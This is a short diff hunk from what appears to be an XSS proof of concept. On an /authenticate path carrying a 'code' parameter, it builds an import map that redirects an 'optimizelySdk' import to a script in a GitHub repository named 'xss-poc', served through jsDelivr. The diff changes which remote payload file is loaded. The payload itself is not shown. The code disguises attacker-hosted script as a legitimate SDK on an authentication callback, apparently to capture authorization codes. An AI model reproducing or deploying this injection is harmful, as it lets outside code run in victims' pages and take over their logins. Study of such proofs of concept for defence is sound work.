@@ -9,7 +9,7 @@ if(searchParams.has('code') && location.pathname ==='/authenticate') {
     JSON.stringify([
       {
         imports: {
-          "optimizelySdk":"https://cdn.jsdelivr.net/gh/CaTzil/xss-poc@main/docy.js"
+          "optimizelySdk":"https://cdn.jsdelivr.net/gh/CaTzil/xss-poc@main/docx1.js"
         },
       },
     ])
